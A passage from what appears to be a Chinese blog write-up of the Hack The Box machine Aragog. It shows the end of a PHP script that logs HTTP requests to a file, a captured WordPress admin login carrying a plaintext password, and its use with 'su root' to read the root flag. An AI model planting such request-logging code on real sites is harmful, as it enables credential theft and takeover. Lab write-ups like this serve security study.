&#x27;</span>);<br>				<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$name</span>));<br>				<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>);<br><br>				<span class="hljs-comment">// add to list</span><br>				<span class="hljs-variable">$headerList</span>[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>			&#125;<br>		&#125;<br><br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$headerList</span>;<br>	&#125;<br>&#125;<br><br><br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DumpHTTPRequestToFile</span>)-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-string">&#x27;./dumprequest.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>等待dumpprequest.txt文件出现，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">florian@aragog:/var/www/html/dev_wiki$ cat dumprequest.txt<br>POST /dev_wiki/wp-login.php HTTP/<span class="hljs-number">1.1</span><br><br>HTTP headers:<br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Connection: keep-alive<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>User-Agent: python-requests/<span class="hljs-number">2.18</span><span class="hljs-number">.4</span><br>Cookie: wordpress_test_cookie=WP Cookie check<br><br>Request body:<br>pwd=%21KRgYs%28JFO%<span class="hljs-number">21</span>%26MTr%29lf&amp;wp-submit=Log+In&amp;testcookie=<span class="hljs-number">1</span>&amp;log=Administrator&amp;redirect_to=http%3A%2F%2F127<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%2Fdev_wiki%2Fwp-admin%2F<br></code></pre></td></tr></table></figure>
+<p>pwd是url编码 解码之后 !KRgYs(JFO!&amp;MTr)lf<br>su root进行提权<br>cat &#x2F;root&#x2F;root.txt</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB-Aragog</div>
+      <div>http://example.com/2023/04/20/HTB-Aragog/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/HTB-Devel/" title="HTB-Devel">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB-Devel</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/HTB-Apocalyst/" title="HTB-Apocalyst">
+                        <span class="hidden-mobile">HTB-Apocalyst</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
